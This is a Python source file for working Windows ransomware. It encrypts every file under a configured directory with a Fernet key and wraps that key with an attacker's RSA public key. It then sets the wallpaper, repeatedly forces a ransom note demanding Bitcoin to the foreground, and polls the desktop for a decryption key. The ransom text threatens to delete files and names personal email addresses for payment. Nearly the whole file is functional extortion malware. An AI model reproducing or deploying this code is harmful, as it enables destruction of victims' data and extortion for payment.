# Local Imports
import os
import webbrowser
import requests
import ctypes
import time
import subprocess
import win32gui
import threading

# Framework Imports
from cryptography.fernet import Fernet
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from dotenv import load_dotenv

load_dotenv()

os.environ["CRYPTOGRAPHY_OPENSSL_NO_LEGACY"] = "1"

PROJECT_NAME = os.getenv('PROJECT_NAME')
DESKTOP_PATH = os.getenv('DESKTOP_PATH')
ENCRYPT_C_DRIVE = os.getenv('ENCRYPT_C_DRIVE') == "True"
ENCRYPTION_PATH = os.getenv('ENCRYPTION_PATH')

PUBLIC_IP_API = 'https://api.ipify.org'


class RansomWare:

    def __init__(self):
        """
        This function will initialize base requirement of the class.
        :param: self
        :return:
        """
        # Fernet object and encrypt/decrypt method
        self.key = None
        # Encrypt/Decrypter
        self.crypter = None
        # RSA public key used for encrypting/decrypting fernet object eg, Symmetric key
        self.public_key = None

        ''' 
        Root directory's to start Encryption/Decryption from
        CAUTION: Do NOT use self.sysRoot on your own PC as you could end up messing up your system etc...
        CAUTION: Play it safe, create a mini root directory to see how this software works it is no different
        CAUTION: eg, use 'localRoot' and create Some folder directory and files in them folders etc.
        '''
        # Use sysroot to create absolute path for files, etc. And for encrypting whole system
        self.sysRoot = os.path.expanduser('~')
        print(self.sysRoot)

        self.localRoot = f'{ENCRYPTION_PATH}'
        self.publicIP = requests.get(PUBLIC_IP_API).text

    @staticmethod
    def change_desktop_background():
        """
        This function will change the desktop background.
        """
        # path = r"C:\Users\Maaz\Documents\Python-Ransomware\bot.jpg"
        path = f"{DESKTOP_PATH}\\{PROJECT_NAME}" + r'\bot.jpg'

        spi_set_desktop_wallpaper = 20
        # Access windows dlls for functionality eg, changing desktop wallpaper
        ctypes.windll.user32.SystemParametersInfoW(spi_set_desktop_wallpaper, 0, path, 0)

    @staticmethod
    def ransom_note():
        """
        This function will write the ransom note in the RANSOM_NOTE file.
        """
        with open('RANSOM_NOTE.txt', 'w') as f:
            f.write(f'''
                ** Your system have been encrypted with a Military grade encryption algorithm. **

                ** There is no way to restore your data without a special key. **

                Only we can decrypt your files!

                To purchase your key and restore your data, please follow these three easy steps:

                1. Email the file called EMAIL_ME.txt at C:\\Users\\Maaz\\Desktop\\EMAIL_ME.txt to 
                maazsabahuddin@gmail.com

                2. You will receive your personal BTC address for payment.
                   Once payment has been completed, send another email to altamashkarlekar@gmail.com stating "PAID".
                   We will check to see if payment has been paid.

                3. You will receive a text file with your KEY that will unlock all your files. 
                   IMPORTANT: To decrypt your files, place text file on desktop and wait. Shortly after it will begin 
                   to decrypt all files.

                WARNING:

                - Do NOT attempt to decrypt your files with any software because that will not work, and may cost you 
                more to unlock your files.

                - Do NOT change file names, mess with the files, or run decryption software as it will cost you more 
                to unlock your files and there is a high chance you will lose your files forever.

                Do NOT send "PAID" button without paying, price WILL go up for disobedience.

                Do NOT think that we won't delete your files altogether and throw away the key if you refuse to pay.
            ''')

    @staticmethod
    def show_ransom_note():
        """
        This function will take care to pop up the ransom note continously.
        """
        # Open the ransom note
        ransom = subprocess.Popen(['notepad.exe', 'RANSOM_NOTE.txt'])
        count = 0  # Debugging/Testing
        while True:
            time.sleep(0.1)
            top_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
            if top_window == 'RANSOM_NOTE - Notepad':
                print('Ransom note is the top window - do nothing')  # Debugging/Testing
                pass
            else:
                print('Ransom note is not the top window - kill/create process again')
                time.sleep(0.1)
                ransom.kill()
                time.sleep(0.1)
                ransom = subprocess.Popen(['notepad.exe', 'RANSOM_NOTE.txt'])

            time.sleep(5)
            count += 1
            if count == 5:
                break

    def generate_key(self):
        """
        This function will generate a URL safe(base64 encoded) key and creates a Fernet object with encrypt/decrypt
        methods. Generates [SYMMETRIC KEY] on victim machine which is used to encrypt the victims' data.
        :param: self
        :return:
        """
        self.key = Fernet.generate_key()
        print(f"Fernet Key {self.key}")

        self.crypter = Fernet(self.key)
        print(f"Crypter {self.crypter}")

    def write_key(self):
        """
        This function will write the fernet(symmetric key) to text file.
        """
        try:
            with open('fernet_key.txt', 'wb') as f:
                f.write(self.key)
        except Exception as e:
            print(f"Error While Writing into fernet_key.txt: {e}")

    def encrypt_fernet_key(self):
        """
        Encrypt [SYMMETRIC KEY] that was created on victim machine to Encrypt/Decrypt files with our PUBLIC ASYMMETRIC-
        -RSA key that was created on OUR MACHINE. We will later be able to DECRYPT the SYMMETRIC KEY used for-
        -Encrypt/Decrypt of files on target machine with our PRIVATE KEY, so that they can then Decrypt files etc.
        :param: self
        :return:
        """
        with open('fernet_key.txt', 'rb') as fk:
            fernet_key = fk.read()
        with open('fernet_key.txt', 'wb') as f:
            # Public RSA key
            self.public_key = RSA.import_key(open('public.pem').read())
            # Public encrypter object
            public_crypter = PKCS1_OAEP.new(self.public_key)
            # Encrypted fernet key
            enc_fernet_key = public_crypter.encrypt(fernet_key)
            # Write encrypted fernet key to file
            f.write(enc_fernet_key)

        # Write encrypted fernet key to the respective location.
        with open(f'{DESKTOP_PATH}\\{PROJECT_NAME}' + r'\EMAIL_ME.txt', 'wb') as fa:
            fa.write(enc_fernet_key)

        # Assign self.key to encrypted fernet key
        self.key = enc_fernet_key
        # Remove fernet crypter object
        self.crypter = None

    def crypt_file(self, file_path, encrypted=False):
        """
        This function will encrypt and decrypt data based on the filepath
        file_path:str:absolute file path (eg, C:/Folder/Folder/Folder/Filename.txt)
        :param: self
        :param: file_path
        :param: encrypted
        :return:
        """
        with open(file_path, 'rb') as f:
            # Read data from file
            data = f.read()
            if not encrypted:
                # Print file contents - [debugging]
                print(data)
                # Encrypt data from file
                _data = self.crypter.encrypt(data)
                # Log file encrypted and print encrypted contents - [debugging]
                print('> File encrypted')
                print(_data)
            else:
                # Decrypt data from file
                _data = self.crypter.decrypt(data)
                # Log file decrypted and print decrypted contents - [debugging]
                print('> File decrypted')
                print(_data)
        with open(file_path, 'wb') as fp:
            # Write encrypted/decrypted data to file using same filename to overwrite original file
            fp.write(_data)

    def crypt_system(self, encrypted=False):

        excluded_dirs = ['AppData', 'Local', r'Programs\Python']
        excluded_files = ['desktop.ini']

        # Walk through all directories and files in C:\Users
        for root, dirs, files in os.walk(self.localRoot, topdown=True):
            dirs[:] = [d for d in dirs if d not in excluded_dirs]
            for file in files:
                if file in excluded_files:
                    continue
                file_path = os.path.join(root, file)
                try:
                    self.crypt_file(file_path, encrypted)
                except Exception as e:
                    print(f"Error processing {file_path}: {e}")

    @staticmethod
    def what_is_bitcoin():
        # Define the file name
        filename = 'ransom.html'

        # URL of the image you want to display
        image_url = f"{DESKTOP_PATH}\\{PROJECT_NAME}" + r"\bot.jpg"

        # Define specific width and height for the image
        image_width = "400"  # Width in pixels
        image_height = "300"  # Height in pixels

        # Ransom note content
        _ransom_note = """
        <div class="ransom-note">
            <h2>Your system has been encrypted with a Military-grade encryption algorithm.</h2>
            <h2>There is no way to restore your data without a special key.</h2>

            <p>Only we can decrypt your files!</p>

            <p>To purchase your key and restore your data, please follow these three easy steps:</p>

            <ol>
                <li>Email the file called EMAIL_ME.txt at C:\\<Project>\\EMAIL_ME.txt to maazsabahuddin@gmail.com</li>
                <li>You will receive your personal BTC address for payment. Once payment has been completed, send 
                another email to altamashkarlekar@gmail.com stating "PAID". We will check to see if payment has been 
                paid.</li>
                <li>You will receive a text file with your KEY that will unlock all your files. IMPORTANT: To decrypt 
                your files, place the text file on the desktop and wait. Shortly after it will begin to decrypt all 
                files.</li>
            </ol>

            <p>WARNING:</p>
            <ul>
                <li>Do NOT attempt to decrypt your files with any software because that will not work, and may cost you 
                more to unlock your files.</li>
                <li>Do NOT change file names, mess with the files, or run decryption software as it will cost you more 
                to unlock your files and there is a high chance you will lose your files forever.</li>
                <li>Do NOT send "PAID" button without paying, the price WILL go up for disobedience.</li>
                <li>Do NOT think that we won't delete your files altogether and throw away the key if you refuse to 
                pay.</li>
            </ul>
        </div>
        """

        # Create and write to the HTML file
        with open(filename, 'w') as file:
            file.write('<html>\n<head>\n<title>Ransom Note</title>\n')
            # Add CSS
            file.write('<style>')
            file.write('body { text-align: center; }')  # Center the content
            file.write(
                '.ransom-note { text-align: left; text-justify: inter-word; max-width: 800px; margin: auto; }'
            )
            file.write('</style>\n')
            file.write('</head>\n<body>\n')

            # Add image with specific width and height
            file.write(f'<img src="{image_url}" alt="Sample Image" width="{image_width}" height="{image_height}">\n')

            # Add ransom note content
            file.write(_ransom_note)

            file.write('</body>\n</html>')

        # Get the absolute path of the file
        abs_path = os.path.abspath(filename)

        # Open in the default web browser
        webbrowser.open(f'file://{abs_path}')

    # Decrypts system when text file with un-encrypted key in it is placed on desktop of target machine
    def put_me_on_desktop(self):
        # Loop to check file and if file it will read key and then self.key + self.cryptor will be valid for decrypting-
        # -the files
        print('started')  # Debugging/Testing
        while True:
            try:
                print('trying')  # Debugging/Testing
                # The ATTACKER decrypts the fernet symmetric key on their machine and then puts the un-encrypted fernet-
                # -key in this file and sends it in an email to victim. They then put this on the desktop, and it will
                # be used to un-encrypt the system. AT NO POINT DO WE GIVE THEM THE PRIVATE ASYMMETRIC KEY etc.
                with open(f'{self.sysRoot}' + r'\Desktop\PUT_ME_ON_DESKTOP.txt', 'r') as f:
                    self.key = f.read()
                    self.crypter = Fernet(self.key)
                    # Decrypt system once have filed is found, and we have cryptor with the correct key
                    self.crypt_system(encrypted=True)
                    print('decrypted')
                    break
            except Exception as e:
                print(e)  # Debugging/Testing
                pass
            time.sleep(10)  # Debugging/Testing check for file on desktop every 10 seconds
            print('Checking for PUT_ME_ON_DESKTOP.txt')  # Debugging/Testing


def main():
    rw = RansomWare()
    rw.generate_key()
    rw.crypt_system()
    rw.write_key()
    rw.encrypt_fernet_key()
    rw.change_desktop_background()
    rw.what_is_bitcoin()
    rw.ransom_note()

    t1 = threading.Thread(target=rw.show_ransom_note)
    t2 = threading.Thread(target=rw.put_me_on_desktop)

    t1.start()
    print('> RansomWare: Attack completed on target machine and system is encrypted')
    print('> RansomWare: Waiting for attacker to give target machine document that '
          'will un-encrypt machine')
    t2.start()
    print('> RansomWare: Target machine has been un-encrypted')
    print('> RansomWare: Completed')


if __name__ == '__main__':
    main()
